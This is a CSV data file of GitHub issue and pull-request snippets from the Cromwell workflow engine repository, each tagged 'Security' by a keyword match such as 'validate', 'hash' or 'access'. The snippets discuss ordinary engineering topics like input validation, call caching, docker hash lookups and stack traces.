Security,Some endpoints validate the workflow Id by checking in the metadata that there is a workflow with this ID.; This is not great because. 1. It relies on metadata; 2. Opens a small window for race conditions. We also return 500 if the workflow does not exist which doesn't seem like the best suited code for that,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3517:15,validat,validate,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3517,1,['validat'],['validate']
Security,"Some light reading for @Horneth and @kshakir. This is largely Frankensteining of ""Olde Style"" code. Known missing or broken, I need to confirm that appropriate tickets exist for the restoration of the following:; - [x] #753 Abort; - [x] #751 Recover; - [x] #749 Preemptibility; - [x] #785 Persistence of any data (note this would not be a ticket to create a KV / metadata service, but to integrate this backend with such a service); - [x] #809 Hashing (prereq for #750); - [x] #750 Caching; - [x] #806 implement Firecloud style auth upload / deletion (the code is not present here); - [x] #808 Retries were removed from command script upload and JES run creation. Lessons learned:; - [x] #811 #812 Actor Factories should be responsible for sanity-checking configs .; - [x] #813 Initialization actors should have the ability to create workflow-level resources that can be shared by the other actors collaborating in the workflow execution. e.g. GCS Filesystems need only be created once per workflow, not for every call.; - [x] It's not clear how workflow logging (or logging in general) should work.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/797:444,Hash,Hashing,444,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/797,1,['Hash'],['Hashing']
Security,Some refactoring: . * Separated the concepts of resolving and downloading.; * `DrsLocalizerMain#resolve` now chooses the `Downloader` implementation based on the content of the Martha response.; * The two downloader implementations support access and GCS URLs respectively.; * Tests for the downloader implementations have been separated from tests for the resolver.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6312:240,access,access,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6312,1,['access'],['access']
Security,"Some sloppy experimental procedure is to blame for incorrect conclusions in the previous (deleted) comment. It's enough for the input and task name to be the same:; ```; workflow x {; call cram; call y { input:; cram = cram.scram; }; }. task cram {; command {; echo "".""; }; output {; String scram = "".""; }; }. task y {; String cram; command {; echo "".""; }; }; ```; ```; ERROR: Bad target for member access 'cram.scram': 'cram' was a String (line 4, col 21):. cram = cram.scram; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3811#issuecomment-418892826:399,access,access,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3811#issuecomment-418892826,1,['access'],['access']
Security,Something looks like it's got an infinite recursion (from SBT logs):; ```; [0m[[0m[31merror[0m] [0m[0mjava.lang.StackOverflowError[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:64)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:211)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:145)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.Tuple2.hashCode(Tuple2.scala:19)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.Statics.anyHash(Statics.java:115)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap$MangledHashing.hash(TrieMap.scala:984)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.computeHash(TrieMap.scala:829)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.get(TrieMap.scala:844)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains$(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.contains(TrieMap.scala:631)[0m; [0m[[0m[31merror[0m] [0m[0m	at scoverage.Invoker$.invoked(Invoker.scala:34)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:44)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloud,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855:189,hash,hashing,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855,4,['hash'],"['hash', 'hashCode', 'hashing']"
Security,"Sometimes getting ""Requester pays bucket access requires authentication."" from google",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336:41,access,access,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"Sorry for the PR bombardment. I came across issue #5271 and noticed this was an issue we also had, and have partially solved already. This is the documentation of our solution. It is not as elegant and efficient as SQLite, but it gets the job done. I have heard of a center that has a separate cromwell server (with database) running **for each user** to get around filesystem permissions and privacy/access concerns. This is a bit unwieldy to say the least. . A file-based database solves these problems by allowing each user to run `cromwell `on the command line and automatically creating a file-based database that is tied to the filesystem permissions.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5320:401,access,access,401,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5320,1,['access'],['access']
Security,Sounds like a potential validate endpoint.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-293584947:24,validat,validate,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-293584947,1,['validat'],['validate']
Security,Spark Backend for the PBE (develop) branch. Need to validate Cromwell's task description for different spark execution modes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1087#issuecomment-229145028:52,validat,validate,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1087#issuecomment-229145028,1,['validat'],['validate']
Security,"Specifically to ""refresh token"" mode credential validation.; Other modes should only be validated once at Cromwell startup, since they don't change for every workflow.; Only ""refresh token mode"" generates different credentials for every workflow (with the refresh token passed in), that need to be validated. Retrying this asynchronously means turning into `Future`s a bunch of methods that were previously synchronous.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2314:48,validat,validation,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2314,3,['validat'],"['validated', 'validation']"
Security,Split docker hash lookups for different registries into different streams so they don't affect each other performances,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329:13,hash,hash,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329,1,['hash'],['hash']
Security,Split out hashing functionality from WdlValue proper.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/348:10,hash,hashing,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/348,1,['hash'],['hashing']
Security,Stacktrace:. ```; 905146-java.net.SocketTimeoutException: Read timed out; 905147- at java.net.SocketInputStream.socketRead0(Native Method) ~[na:1.8.0_72]; 905148- at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) ~[na:1.8.0_72]; 905149- at java.net.SocketInputStream.read(SocketInputStream.java:170) ~[na:1.8.0_72]; 905150- at java.net.SocketInputStream.read(SocketInputStream.java:141) ~[na:1.8.0_72]; 905151- at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) ~[na:1.8.0_72]; 905152- at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72]; 905153- at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; 905154- at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72]; 905155- at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72]; 905156- at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72]; 905157- at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72]; 905158- at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72]; 905159- at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72]; 905160- at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72]; 905161- at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72]; 905162- at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441) ~[na:1.8.0_72]; 905163- at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480) ~[na:1.8.0_72]; 905164- at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338) ~[na:1.8.0_72]; 905165- at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37) ~[cromwell.jar:0.19]; 905166- at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94) ~[cromwell.jar:0,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:437,secur,security,437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,5,['secur'],['security']
Security,"Standardize docker builds with git commits. Automatically build docker images and push to the cromwell docker hub when certain commits occur on certain git branches. A suggested tagging scheme in docker could be:; <Cromwell-version>-<git-commit-hash>. For example: 0.21-5273abb This not only informs you what major cromwell version it is but also the specific git hash. And this tag would pretty much not ever move. Additionally a moving tag could be built with just the <cromwell-version> (ex. 0.21) This will always be the most recent commit for that version. And of course it will be updated each time. Tasks. - [x] change docker image labeling to be <version>-<git-commit-hash> in Settings.scala; - [x] change .travis.yml to run 'sbt dockerBuildAndPush' as part of the after_success step (confirm that is the right place; - [x] manually publish the docker image for the 0.21 latest release (ie checkout, sbt dockerBuildAndPush). ; - [x] also tag ^^ with 0.21; - [x] at this tagging step to our release process document; - [x] tell @hjfbynara and @abaumann about ^^",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1654:245,hash,hash,245,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1654,3,['hash'],['hash']
Security,"Starting to spider out the proofing of concept for a google-y metadata system into something which is actually storing events as well as providing a not horribly inefficient read access for the current set of metadata-y endpoints. A high level description: Stream metadata events out of Cromwell via Google PubSub, and store them in two locations. The first is a permanent event store which will be storing these events in an immutable fashion, which will allow us to be flexible with downstream presentation w/o information loss. The second will be a set of SQL tables which have been designed to provide efficient results for all of the standard Cromwell metadata endpoints such as metadata, status, outputs, etc. For Broad folks, more information is available [here](https://docs.google.com/document/d/1F5WsEAKvYx6njdF-yJZ4LHvT39KcErCdBpCOySq-NoQ/edit)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3243:179,access,access,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3243,1,['access'],['access']
Security,Store the hashes of workflow inputs at submit time and make them retrievable,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629:10,hash,hashes,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629,1,['hash'],['hashes']
Security,"Strange ""Boxed Error"", probably authorization / config",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:32,authoriz,authorization,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['authoriz'],['authorization']
Security,Streamline the validation of inputs during submission to a single place,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/337:15,validat,validation,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/337,1,['validat'],['validation']
Security,"StringifyJSObject();; testStringifyScriptObject();; }. /**; * Create and use an object in Javascript, return it to Java, and then pass it back into similar Javascript. In the; * second Javascript call we cannot use our key in the same way.; */; private static void testKeyCastImplicit() throws ScriptException {; final String expr1 = expr(; ""var obj = {};"",; ""obj[true] = 'world';"",; ""print('testKeyCastImplicit hello init ' + obj[true]);"",; ""obj;""; );; final Map<String, Object> args1 = Collections.emptyMap();; final JSObject result1 = (JSObject) eval(expr1, args1);; ; /*; JSObjectLinker does not cast keys to strings during get (and similarly in put).; - https://github.com/JetBrains/jdk8u_nashorn/blob/jdk8u76-b03/src/jdk/nashorn/internal/runtime/linker/JSObjectLinker.java#L179; - http://hg.openjdk.java.net/jdk9/jdk9/nashorn/file/17cc754c8936/src/jdk.scripting.nashorn/share/classes/jdk/nashorn/internal/runtime/linker/JSObjectLinker.java#l190. According to ECMA, property accessors in brackets are expressions and not identifier-name-string:. > 3. Let propertyNameReference be the result of evaluating Expression.; > 4. Let propertyNameValue be GetValue(propertyNameReference).; > ...; > 6. Let propertyNameString be ToString(propertyNameValue). - https://www.ecma-international.org/ecma-262/5.1/#sec-11.2.1. Similarly according to the MDN:. > Property names must be strings. This means that non-string objects cannot be used as keys in the object. Any; > non-string object, including a number, is typecasted into a string via the toString method. - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Property_Accessors#Property_names. This is not totally unexpected as according to the Nashorn engine notes:. > not every operation and script API (JSON, Array, Function's properties/functions) treats ScriptObjectMirror; > and jdk.nashorn.internal.runtime.ScriptObject uniformly. There are places where ScriptObjects work as; > expected but if you pass ScriptObjectMir",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573:2174,access,accessors,2174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573,1,['access'],['accessors']
Security,Submission goes to ValidationActor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/568:19,Validat,ValidationActor,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/568,1,['Validat'],['ValidationActor']
Security,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:322,access,access,322,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134,2,['access'],['access']
Security,"Support for Batch will be added in the upcoming Cromwell 86 release. If you'd like test it in advance of the official release, you can access development branch builds of Cromwell 86 at `broadinstitute/cromwell:86-<short git hash from develop>`, for example `broadinstitute/cromwell:86-aea7343`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228:135,access,access,135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7215#issuecomment-1716365228,2,"['access', 'hash']","['access', 'hash']"
Security,Support for S3FS authentication via Cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3746:17,authenticat,authentication,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3746,1,['authenticat'],['authentication']
Security,Support for docker hash lookup of public quay.io images,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2184:19,hash,hash,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2184,1,['hash'],['hash']
Security,Support high security networks (VPCs) specified in Google project labels,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4806:13,secur,security,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4806,1,['secur'],['security']
Security,"Sure !. This is a minimal workflow that runs a task with a dynamic number of GPUs; ```version 1.0. workflow gpu_example {. call maybe_gpu {; input:; gpu_count = 0; }. }. task maybe_gpu {. input {; Int gpu_count; }. command {; echo 1; }. runtime {; docker: ""ubuntu:16.04""; gpuCount: gpu_count; gpuType: ""nvidia-tesla-t4""; }; }; ```. When ran with `gpu_count = 0`, the cromwell runtime validation fails because it is expecting a non-null integer.; ```; 2022-02-14 16:48:34,798 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - WorkflowExecutionActor-45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 [UUID(45f6febb)]: Starting gpu_example.maybe_gpu; 2022-02-14 16:48:39,643 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Assigned new job execution tokens to the following groups: 45f6febb: 1; 2022-02-14 16:48:41,244 cromwell-system-akka.dispatchers.backend-dispatcher-31 ERROR - Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0; 2022-02-14 16:48:42,011 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - WorkflowManagerActor: Workflow 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1$$anon$1: PipelinesApiAsyncBackendJobExecutionActor failed and didn't catch its exception. This condition has been handled and the job will be marked as failed.; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting gpuCount runtime attribute value greater than 0. 2022-02-14 16:48:44,341 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - WorkflowManagerActor: Workflow actor for 45f6febb-8625-43ce-8bd5-fe0ab71d3fe7 completed with status 'Failed'. The workflow will be removed from the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757:384,validat,validation,384,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679#issuecomment-1039388757,2,['validat'],['validation']
Security,"Sure... any time a file is listed twice in the input. This actually does; happen. In cancer, we often have several tumor samples, but only one; normal. But we make a pair for each tumor sample (paired with the same; normal), so the normal would get localized multiple times. When I filed; this, I was working on a validation for our clinical work and that one uses; the same normal for about 9 pairs. On Tue, Aug 22, 2017 at 6:11 PM, Kate Voss <notifications@github.com> wrote:. > @LeeTL1220 <https://github.com/leetl1220> can you explain the exact use; > case for when there are two copies of a file?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-324166111>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk19JlQd7ln14Z5sg60SKZcBHgrviks5sa1H1gaJpZM4JuaZs>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-325671888:314,validat,validation,314,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-325671888,1,['validat'],['validation']
Security,Switch WOM GraphNode.equals and hashCode to object identity,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2694:32,hash,hashCode,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2694,2,['hash'],['hashCode']
Security,Switch from travis encrypted files to vault. Closes #1296,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2481:19,encrypt,encrypted,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2481,1,['encrypt'],['encrypted']
Security,"Switching GraphNode.{equals, hashCode} from component-based to reference (object identity)-based. Update two unit tests to reflect the change.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2741:29,hash,hashCode,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2741,1,['hash'],['hashCode']
Security,Synchronize access to Liquibase APIs.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4390:12,access,access,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4390,1,['access'],['access']
Security,Synchronize access to Logback context.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3956:12,access,access,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3956,1,['access'],['access']
Security,Synchronize access to Logback context. [34 hotfix],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3957:12,access,access,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3957,1,['access'],['access']
Security,Synchronize access to workflow store,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3761:12,access,access,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3761,1,['access'],['access']
Security,"T will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false. // Max number of retries per job that the engine will attempt in case of a retryable failure received from the backend; max-retries = 10. // If 'true' then when Cromwell starts up, it tries to restart incomplete workflows; workflow-restart = true. // Cromwell will cap the number of running workflows at N; max-concurrent-workflows = 5000. // Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; max-workflow-launch-count = 50. // Number of seconds between workflow launches; new-workflow-poll-rate = 20. // Since the WorkflowLogCopyRouter is initialized in code, this is the number of workers; number-of-workflow-log-copy-workers = 10; }. workflow-options {; // These workflow options will be encrypted when stored in the database; encrypted-fields: []. // AES-256 key to use to encrypt the values in `encrypted-fields`; base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="". // Directory where to write per workflow logs; workflow-log-dir: ""cromwell-workflow-logs"". // When true, per workflow logs will be deleted after copying; workflow-log-temporary: true. // Workflow-failure-mode determines what happens to other calls when a call fails. Can be either ContinueWhilePossible or NoNewCalls.; // Can also be overridden in workflow options. Defaults to NoNewCalls. Uncomment to change:; //workflow-failure-mode: ""ContinueWhilePossible""; }. // Optional call-caching configuration.; call-caching {; enabled = true. // The Docker image specified in the 'runtime' section of a task can be used as-is; // or Cromwell can lookup this Docker image to get a complete hash. For example,; // if a task specifies docker: ""ubuntu:latest"" and if lookup-docker-hash is true,; // Then Cromwell would query DockerHub to resolve ""ubuntu:latest"" to something like; // a2c950138e95bf603d919d0f74bec16a81d5cc1e3c3d574e8d5ed59",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:85452,encrypt,encrypt,85452,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,3,['encrypt'],"['encrypt', 'encrypted-fields', 'encryption-key']"
Security,"T-322 9e4f5894:main.year_of_birth:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:15:03,84] [info] BT-322 9e4f5894:main.kinship_count:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:15:03,84] [info] BT-322 9e4f5894:main.reported_sex:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:15:03,84] [info] BT-322 9e4f5894:main.genetic_sex:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:15:03,84] [info] BT-322 9e4f5894:main.sex_aneuploidy:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:22:59,01] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.kinship_count:-1:1-20000000009 [9e4f5894main.kinship_count:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,03] [info] BT-322 9e4f5894:main.kinship_count:-1:1 cache hit copying success with aggregated hashes: initial = 40DB3965745EAB4613A3E2804F447EFE, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,03] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.kinship_count:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:22:59,12] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.reported_sex:-1:1-20000000001 [9e4f5894main.reported_sex:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,12] [info] BT-322 9e4f5894:main.reported_sex:-1:1 cache hit copying success with aggregated hashes: initial = 91C81CABBB083C238800E3CF59AF537D, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,12] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.reported_sex:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:22:59,16] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-Backe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:21634,hash,hashes,21634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,TODO Add ARN validation [BA-5994],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5170:13,validat,validation,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5170,1,['validat'],['validation']
Security,"TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246076:33,hash,hash,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246076,1,['hash'],['hash']
Security,"Take the following simply WDL:; ```; version 1.0. workflow main {; call main {; input:; }; }. task main {; input {; String str; }. command <<<; >>>; }; ```. It will validate with Womtool:; ```; $ java -jar womtool-85.jar validate main.wdl ; Success!; ```. However, if you try to run it:; ```; $ java -jar cromwell-85.jar run main.wdl ; ...; Required workflow input 'main.main.str' not specified; ...; ```; It will immediately fail without being executed. Couldn't the same code in Cromwell that spots these errors be included in Womtool?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7139:165,validat,validate,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7139,2,['validat'],['validate']
Security,"Takes the proof of concept as far as:. - A core WDL package which is the base for draft 2 and draft 3.; - Answers ""can I separate the common classes out of WdlParser?"" I believe I can.; - Sees what it looks like to inject a new piece of functionality into the middle of WdlStandardLibrary to replace the `size` function (`size` was awkwardly implemented in full in `IoFunctions` which needed to be changed, so it was in some ways a bad example but in others it was a good one since it highlights the kinds of hurdles this draft2/draft3 splitting is going to involve in general).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3234:215,inject,inject,215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3234,1,['inject'],['inject']
Security,Task validation only happens at job execution time,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3326:5,validat,validation,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3326,1,['validat'],['validation']
